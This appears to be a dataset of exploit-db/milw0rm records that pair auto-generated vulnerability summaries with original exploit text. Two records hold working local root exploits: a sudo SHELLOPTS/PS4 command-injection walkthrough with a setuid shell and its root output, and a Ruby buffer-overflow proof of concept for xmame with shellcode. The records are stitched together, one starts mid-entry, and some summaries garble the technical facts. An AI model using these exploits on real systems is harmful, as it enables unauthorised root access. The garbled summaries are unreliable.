column2: #<-- Publish Date --># 2003-12-02 #<-- Technical Document Summary (TDS) --># The technical mechanism involves using sys_brk to directly manipulate the kernel's virtual address space, bypassing memory checks by selecting a high virtual address as base. The vulnerability lies in the kernel's insufficient validation of breakpoint expansion addresses, allowing an attacker to expand their break and achieve privilege escalation. The affected component is the Linux kernel's memory management subsystem, specifically the do_brk function used during breakpoint setup. This weakness resides in the kernel's ability to handle virtual address alignment without proper boundary checks. #<-- Layman's Document Summary (LDS) --># The weakness allows an attacker to expand their virtual address space to gain higher privileges on a Linux system. This exploit enables privilege escalation by exploiting a local vulnerability in the kernel's memory management code, specifically through manipulation of the do_brk function during breakpoint expansion. It does not claim successful exploitation as demonstrated in the source. #<-- Key Words (KW) --># exploit-db, Linux Kernel 2.4.22, do_brk, virtual address space expansion, privilege escalation, sys_brk, mremap, kernel memory management, CVE-2003-0961, local privilege escalation #<-- Related Terms --># exploit, Linux Kernel 2.4.22, do_brk, virtual address space, privilege escalation, sys_brk, mremap, kernel memory management, CVE-2003-0961, local privilege escalation #<-- Entities/Attributes --># Software: Linux Kernel 2.4.22 Version: 2.4.22 Author: Christophe Devine, Julien Tinnes Platform: Linux Functions: sys_brk, mremap, nanosleep, fork Paths: / (root filesystem) Not specified in source #<-- Vulnerability Type --># Local privilege escalation via virtual address space manipulation #<-- Original Content --># ; #<-- Publish Date --># 2005-11-09 #<-- Technical Document Summary (TDS) --># The exploit leverages a vulnerability in the SHELLOPTS environment variable handling of sudo on Linux systems. By manipulating the SHELLOPTS file, an attacker can execute arbitrary commands as root without authentication. This mechanism allows privilege escalation through a local root escalation flaw in sudo's configuration management. #<-- Layman's Document Summary (LDS) --># An attacker with sudo access can modify environment variables to gain unauthorized root privileges on a Linux system. The issue stems from improper handling of the SHELLOPTS file within the sudo configuration process, enabling command execution as the root user without additional credentials. #<-- Key Words (KW) --># sudo, SHELLOPTS, privilege escalation, local root, vulnerability, environment variable, csh shell, egg.c, setuid, system("/bin/sh"), sudoers, file permissions #<-- Related Terms --># Sudo, Shell, Environment Variables, Privilege Escalation, Root Access, Linux, Vulnerability, Command Execution, Configuration Management #<-- Entities/Attributes --># Product: Sudo Version: 1.6.8p9 Affected Component: SHELLOPTS file Local OS: Linux Function: setuid System: /bin/sh #<-- Vulnerability Type --># Not specified in source #<-- Original Content --># ## Sudo local root escalation privilege ## ## vuln versions : sudo < 1.6.8p10 ## by breno ## You need sudo access execution for some bash script ## ## Use csh shell to change SHELLOPTS env ## ie: %cat x.sh #!/bin/bash -x echo "Getting root!!" % ## ## # cat /etc/sudoers ... breno ALL=(ALL) /home/breno/x.sh .. # ## Let's use an egg shell :) %cat egg.c #include <stdio.h> int main() { setuid(0); system("/bin/sh"); } % % gcc -o egg egg.c % setenv SHELLOPTS xtrace % setenv PS4 '$(chown root:root egg)' % sudo ./x.sh echo Getting root!! Getting root!! % ls -lisa egg 1198941 8 -rwxr-xr-x 1 root root 7428 2005-11-09 13:54 egg % setenv PS4 '$(chmod +s egg)' % sudo ./x.sh echo Getting root!! Getting root!! % ./egg sh-3.00# id uid=0(root) gid=1000(breno) egid=0(root) grupos=7(lp),102(lpadmin),1000(breno) sh-3.00# # milw0rm.com [2005-11-09]

The vulnerability stems from improper input validation of user-supplied command-line arguments, allowing an attacker to write arbitrary data beyond the intended buffer size. This enables the injection of malicious code into memory, which is then executed by the system. The affected component is the xmame multimedia player, specifically its configuration handling of the "-lang" option. # #<-- Layman's Document Summary (LDS) --># # The weakness allows an attacker to execute arbitrary code on the system by sending a crafted command-line argument to the xmame application. This occurs because the program fails to properly sanitize input when constructing a buffer for execution, leading to a memory corruption that can be exploited to run shellcode. # #<-- Key Words (KW) --># # exploit,local buffer overflow,xmame,lang option,shellcode execution,Linux,kernel vulnerability,OSVDB-22481 # #<-- Related Terms --># # buffer overflow,exploit,local code execution,software vulnerability,operating system,exploit-db,osvdb # #<-- Entities/Attributes --># # Software: xmame # Version: 0.102 # File path: /usr/games/xmame.x11 # Argument: -lang # Vulnerability ID: CVE-2006-0176 # Platform: Linux # Architecture: i686 # Programming language: Ruby # #<-- Vulnerability Type --># # Not specified in source # #<-- Original Content --># #!/usr/bin/ruby # # One of the PoC code for xmame "-lang" options. # Advisory is base on : http://kerneltrap.org/node/6055 # # by xwings at mysec dot org # url : http://www.mysec.org , new website # Tested on : # Linux debian24 2.4.27-2-386 #1 Mon May 16 16:47:51 JST 2005 i686 GNU/Linux # gcc version 4.0.3 20060104 (prerelease) (Ubuntu 4.0.2-6ubuntu1) # xmame 0.102 , ./configure && make && make install # #setreuid(geteuid(),geteuid()) execl(); executes /bin//sh 49 bytes. shellcode = "\x31\xc9\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0"+ "\x46\xcd\x80\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"+ "\x6e\x89\xe3\x51\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80\xb0\x01"+ "\x31\xdb\xcd\x80" vulnpath = "/usr/games/xmame.x11" argvopt = "-lang" ret = (0xbfffe8da) retadd = ([ret].pack('V')) nops = ("\x90" * (1056 - (shellcode.length + retadd.length))) buffer = nops+shellcode+retadd system(vulnpath,argvopt,buffer) # milw0rm.com [2006-01-10]
